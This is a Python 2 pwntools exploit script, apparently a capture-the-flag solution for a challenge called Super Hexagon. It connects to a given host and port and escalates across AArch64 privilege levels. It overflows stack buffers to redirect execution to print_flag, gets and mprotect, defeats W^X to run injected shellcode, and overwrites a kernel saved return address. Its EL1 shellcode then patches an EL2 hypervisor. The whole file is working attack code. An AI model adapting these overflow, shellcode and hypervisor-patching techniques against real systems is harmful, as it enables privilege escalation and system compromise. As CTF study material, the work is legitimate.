#!/usr/bin/env python2
import sys
# pwntools breaks sys.argv by pulling out random arguments...
orig_args = []; orig_args += sys.argv

from pwn import *
from binascii import hexlify
import argparse

# this requires that `aarch64-linux-gnu-as' is installed
context.arch = 'aarch64'

# keystore offsets (EL0)
print_flag = 0x00400104
mprotect   = 0x00401B68
gets = 0x4019B0

# no ASLR so always constant
mmap_buffer_start = 0x7ffeffffd000
mmap_el1_buffer_start = 0x7ffeffffc000

# Non-secure Kernel offsets (EL1)
print_el1_flag = 0xFFFFFFFFc0008408

# AArch64 code
arm_inf_loop = p32(0x14000000)
arm_nop = p32(0xd503201f)

"""
Page layout TTBR0_EL1 - 0x20000
Each entry is a table of 4GB
EL0 Range - 0xffff_ffffffff -> 0x0000_00000000

3 tables before PTE
PD -> PT0 -> PT1 -> PTE

Ex: EL0 stack is at 0x7fff7fff0000
TTBR0_EL1 -> PT (VA >> 39) ->
Level1 - 
"""

def set_buffer_perm(p, prot):
    ## save key
    p.sendline('1')

    # arguments to cmd: buf (X0), idx (X1), len (X2)
    # arguments to mprotect: mem (X0), len (X1), prot (X2)
    p.sendline('4096\x00' + 'A'*0xfb + p64(print_flag) + p64(mprotect)) # send idx (overflow too)

    ## Send the key
    # The kernel has W^X, so we cannot have writeable executable pages
    p.sendline('A'*prot) # key len -> prot
    print(p.recvuntil('cmd>'))
    print("[+] Buffer permissions: %d" % prot)

def load_shellcode(filename, origin=0, banned=[]):
    assembly = open(filename).read()
    shellcode = asm(assembly, vma=origin)

    for i,d in enumerate(shellcode):
        if d in banned:
            insn = disasm(shellcode[i/4*4:i/4*4+4], vma=origin)
            print("ERROR: shellcode checks failed")
            print("ERROR: banned character found @ insn %d (char %s)" % (i/4, repr(d)))
            print(insn)
            sys.exit(1)

    return shellcode

def do_EL0(p):
    p.sendline('0')
    p.sendline('A'*0x100 + p64(print_flag))
    flag = p.recvline()
    print(flag)

def do_EL1(p):
    shellcode = load_shellcode('el0-shellcode.S', origin=mmap_buffer_start, banned=['\n', '\r'])
    print('[+] EL0 Shellcode: %s (%d bytes)' % (hexlify(shellcode), len(shellcode)))

    ## Fill our buffer with shellcode :)
    p.sendline('0')
    p.sendline('A'*0x100 + p64(gets))
    p.sendline(shellcode)
    print(p.recvuntil('cmd>'))

    print("[+] Shellcode Loaded")

    # PROT_EXEC (4) | PROT_READ (1) = 5
    set_buffer_perm(p, 4 | 1)

    ## Execute the shellcode in buffer!
    p.sendline('0')
    p.sendline('A'*0x100 + p64(mmap_buffer_start+0x10))

    p.send(p64(0x4141414142424242) + p64(print_el1_flag+4))
    p.send("\x94") 

    print('[+] Shellcode successfully executed')
    print(p.recvall())

def do_EL2(p):
    shellcode = load_shellcode('el0-shellcode-page.S', origin=mmap_buffer_start, banned=['\n', '\r'])
    print('[+] EL0 Shellcode: %s (%d bytes)' % (hexlify(shellcode), len(shellcode)))
    shellcode_el1 = load_shellcode('el1-shellcode.S', origin=mmap_el1_buffer_start, banned=['\n', '\r'])
    print('[+] EL1 Shellcode: %s (%d bytes)' % (hexlify(shellcode_el1), len(shellcode_el1)))
    shellcode_el2 = load_shellcode('el2-shellcode.S', origin=0x40100000, banned=['\n', '\r'])
    print('[+] EL2 Shellcode: %s (%d bytes)' % (hexlify(shellcode_el2), len(shellcode_el2)))

    ## Fill our buffer with shellcode :)
    p.sendline('0')
    p.sendline('A'*0x100 + p64(gets))
    p.sendline(shellcode)
    print(p.recvuntil('cmd>'))

    print("[+] EL0 Shellcode Loaded")

    # PROT_EXEC (4) | PROT_READ (1) = 5
    set_buffer_perm(p, 4 | 1)

    ## Execute the shellcode in buffer!
    p.sendline('0')
    p.sendline('A'*0x100 + p64(mmap_buffer_start+0x10))

    p.sendline(shellcode_el1)
    print("[+] EL1 Shellcode Loaded")
    p.send('\x00') # PTE XN set to zero

    p.send(p64(0x4141414142424242) + p64(mmap_el1_buffer_start))
    # change kernel saved LR from 0xfffffffc000a830
    # to 0xfffffffc0009430 (a good gadget spot)
    # FFFFFFFFC0009430:   LDP             X19, X20, [SP,#var_s10]
    #                     LDP             X29, X30, [SP],#0x20
    #                     RET
    p.send("\x94")

    # Send patching commands to our EL1 shellcode
    # We need to patchup the first EL2 page to
    # get reliable control over the hypervisor without
    # crashing stuff

    # Used to create an unconditional AArch64 branch
    # Offset is the number of instructions, not bytes
    def mkbr(offset):
        # 26 bits
        offset &= 0x3ffffff
        v = (0b000101 << 26) | offset
        return p32(v)

    # Interact with our EL1 shellcode to patch the EL2 hypervisor
    # pointer is to 0x0000 initially
    WRITE = 0
    SEEK = 1
    DONE = 2

    # Write our shellcode at 0x40100000
    # Patch the instruction at 0x40100418 to jump to shellcode
    # This is triggered by an SMC instruction from EL1
    commands = [
        [WRITE, shellcode_el2],
        [SEEK, 0x418],
        [WRITE, mkbr(-0x418/4)],
        [DONE]
    ]

    for cmd in commands:
        op = cmd[0]
        if op == WRITE:
            for byte in cmd[1]:
                p.send(chr(WRITE) + byte)
        elif op == SEEK:
            p.send(chr(SEEK) + p16(cmd[1]))
        elif op == DONE:
            p.send(chr(DONE))

    print('[+] EL1 + EL2 Shellcode successfully executed')
    print(p.recvall())

def do_SEL0(p):
    p.interactive()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', required=True, help="Host to target")
    parser.add_argument('--port', required=True, type=int, help="Port of target")
    parser.add_argument('--level', required=True, help="Which flag to exploit")
    parser.add_argument('--dev', action="store_true", help="Try on test server")
    args = parser.parse_args(orig_args[1:])

    print("Super Hexagon Solver")
    print(" by DigitalCold")
    print("")

    p = remote(args.target, args.port)

    print("[+] Exploiting " + args.level)

    start = p.recvuntil('cmd>')
    print("[+] Got banner")
    print start

    if args.level == "EL0":
        do_EL0(p)
    elif args.level == "EL1":
        do_EL1(p)
    elif args.level == "EL2":
        do_EL2(p)
    elif args.level == "S-EL0":
        do_SEL0(p)
    else:
        print("[-] Unknown exploit level " + args.level)

    p.close()

if __name__ == "__main__":
    main()
